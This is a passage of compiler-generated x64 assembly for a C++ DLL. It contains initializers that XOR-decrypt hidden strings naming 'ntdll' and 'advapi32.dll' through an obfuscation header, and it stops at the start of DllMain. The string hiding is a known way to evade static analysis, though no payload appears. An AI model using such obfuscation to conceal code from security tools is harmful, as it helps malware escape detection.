?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA PROC ; `ProcessUtilities::freqDLLS::`dynamic initializer for 'ntdll'''::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA ENDP ; `ProcessUtilities::freqDLLS::`dynamic initializer for 'ntdll'''::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ
text$yd	SEGMENT
??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ PROC	; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'ntdll'', COMDAT
	sub	rsp, 40					; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR ?ntdll@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B+24
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN20@dynamic
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR ?ntdll@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN34@dynamic

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	SHORT $LN43@dynamic
$LN34@dynamic:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN20@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	movdqa	xmm0, XMMWORD PTR __xmm@000000000000000f0000000000000000
	movdqa	XMMWORD PTR ?ntdll@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B+16, xmm0

; 4876 :         _My_data._Myres  = _Small_string_capacity;
; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR ?ntdll@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B, 0
	add	rsp, 40					; 00000028H
	ret	0
$LN43@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN41@dynamic:
??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ ENDP	; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'ntdll''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@YAXXZ PROC ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@4V45@A
	mov	rax, QWORD PTR [rax+rcx*8]

; 132  : 				m_data[i] = 0;

	mov	QWORD PTR [rax+rdx], 0
	mov	WORD PTR [rax+rdx+8], 0
	ret	0
??__Fobfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@YAXXZ ENDP ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ
_TEXT	SEGMENT
this$dead$ = 48
??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ PROC ; ProcessUtilities::freqDLLS::<lambda_3>::operator(), COMDAT

; 35   : 		static const std::string advapi32 = std::string(HIDE("advapi32.dll"));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN26@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [rdx+r8]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+10], 32315145		; 01ed1709H
	mov	DWORD PTR [rbx], 437478856		; 1a1365c8H
	mov	DWORD PTR [rbx+4], 1707624605		; 65c8489dH
	mov	WORD PTR [rbx+8], 25991			; 00006587H
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 35   : 		static const std::string advapi32 = std::string(HIDE("advapi32.dll"));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@YAXXZ ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN26@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ ENDP ; ProcessUtilities::freqDLLS::<lambda_3>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@4HA PROC ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@4HA ENDP ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
;	COMDAT ??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
text$di	SEGMENT
??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ PROC	; ProcessUtilities::freqDLLS::`dynamic initializer for 'advapi32'', COMDAT

; 35   : 		static const std::string advapi32 = std::string(HIDE("advapi32.dll"));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	ebx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@4V45@A
	add	rbx, rdx
	test	al, 1
	jne	SHORT $LN47@dynamic
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+10], 32315145		; 01ed1709H
	mov	DWORD PTR [rbx], 437478856		; 1a1365c8H
	mov	DWORD PTR [rbx+4], 1707624605		; 65c8489dH
	mov	WORD PTR [rbx+8], 25991			; 00006587H
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 35   : 		static const std::string advapi32 = std::string(HIDE("advapi32.dll"));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@YAXXZ ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
$LN47@dynamic:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 147  : 			if ( m_encrypted )

	cmp	BYTE PTR [rbx+13], 0
	je	$LN15@dynamic

; 148  : 			{
; 149  : 				cipher(m_data, N, KEY);

	xor	r8d, r8d
	cmp	DWORD PTR __isa_available, 5
	jl	$LN56@dynamic

; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movdqa	xmm3, XMMWORD PTR __xmm@57fb21ed7b6501a957fb21ed7b6501a9
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000010000000000000000
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	movdqa	xmm2, XMMWORD PTR __xmm@00000000000008000000000000000800
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000030000000000000002
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+2]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+2], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000050000000000000004
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+4]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+4], ax
	movdqa	xmm0, XMMWORD PTR __xmm@00000000000000070000000000000006
	psllq	xmm0, 3
	vpsrlvq	xmm1, xmm3, xmm0
	pshufb	xmm1, xmm2
	movzx	eax, WORD PTR [rbx+6]
	movd	xmm0, eax
	xorps	xmm1, xmm0
	movd	eax, xmm1
	mov	WORD PTR [rbx+6], ax

; 68   : 		for ( size_type i = 0; i < size; i++ )

	mov	r8d, 8
$LN56@dynamic:
	mov	r9, 6339698204315287977			; 57fb21ed7b6501a9H
	npad	6
$LL55@dynamic:

; 69   : 		{
; 70   : 			data[i] ^= CHAR_TYPE(( key >> ( ( i % 8 ) * 8 ) ) & 0xFF);

	movzx	ecx, r8b
	and	cl, 7
	shl	cl, 3
	mov	rdx, r9
	shr	rdx, cl
	xor	BYTE PTR [rbx+r8], dl

; 68   : 		for ( size_type i = 0; i < size; i++ )

	inc	r8
	cmp	r8, 13
	jb	SHORT $LL55@dynamic

; 150  : 				m_encrypted = false;

	mov	BYTE PTR [rbx+13], 0
$LN15@dynamic:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 35   : 		static const std::string advapi32 = std::string(HIDE("advapi32.dll"));

	mov	rdx, rbx
	lea	rcx, OFFSET FLAT:?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	lea	rcx, OFFSET FLAT:??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ ; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'advapi32''
	add	rsp, 32					; 00000020H
	pop	rbx
	jmp	atexit
??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ ENDP	; ProcessUtilities::freqDLLS::`dynamic initializer for 'advapi32''
text$di	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA PROC ; `ProcessUtilities::freqDLLS::`dynamic initializer for 'advapi32'''::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA ENDP ; `ProcessUtilities::freqDLLS::`dynamic initializer for 'advapi32'''::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
text$yd	SEGMENT
??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ PROC	; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'advapi32'', COMDAT
	sub	rsp, 40					; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR ?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B+24
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN20@dynamic
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR ?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, rcx

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN34@dynamic

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H
	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	SHORT $LN43@dynamic
$LN34@dynamic:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN20@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	movdqa	xmm0, XMMWORD PTR __xmm@000000000000000f0000000000000000
	movdqa	XMMWORD PTR ?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B+16, xmm0

; 4876 :         _My_data._Myres  = _Small_string_capacity;
; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR ?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B, 0
	add	rsp, 40					; 00000028H
	ret	0
$LN43@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN41@dynamic:
??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ ENDP	; ProcessUtilities::freqDLLS::`dynamic atexit destructor for 'advapi32''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@YAXXZ PROC ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@4V45@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rdx], rax
	mov	DWORD PTR [rdx+8], eax
	mov	BYTE PTR [rdx+12], al
	ret	0
??__Fobfuscated_data@?1???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@YAXXZ ENDP ; `ProcessUtilities::freqDLLS::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\dllmain.cpp
;	COMDAT DllMain
_TEXT	SEGMENT
